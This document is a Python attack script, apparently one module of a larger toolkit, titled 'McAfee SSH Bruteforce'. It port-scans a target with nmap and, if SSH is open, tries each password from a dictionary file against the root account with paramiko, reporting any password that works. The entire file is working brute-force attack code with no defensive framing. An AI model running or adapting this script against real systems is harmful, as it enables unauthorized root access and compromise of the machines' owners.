#!/usr/bin/env python3

# McAfee SSH Bruteforce

# %%%%%%%%%%% Libraries %%%%%%%%%%%#

import os
import nmap
import logging
import globals
import paramiko

# %%%%%%%%%% Functions %%%%%%%%%#


def mcafee_ssh_brute(ip):
    __location__ = os.path.realpath(
        os.path.join(os.getcwd(), os.path.dirname(__file__)))
    file = open(os.path.join(__location__, 'dict.txt'))
    nm = nmap.PortScanner()
    bps = 0

    try:
        nm.scan(hosts=ip, arguments='-sT -T4 -p 22')
        if nm[ip]['tcp'][22]['state'] == 'open':
            for line in file:
                password = line.strip('\n\r')
                if ssh_credentials(ip, password):
                    mess = ['root', password]
                    globals.messages(7)
                    globals.messages(9, mess)
                    file.close()
                    bps = 1
                    break
            if bps == 0:
                globals.messages(8)
                file.close()
        else:
            globals.messages(8)
            file.close()

    except Exception as e:
        globals.messages(8)
        file.close()
        logging.error(e, exc_info=True)


def ssh_credentials(ip, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(ip, username='root', password=password,
                    banner_timeout=2000)
        return True
    except paramiko.AuthenticationException:
        return False
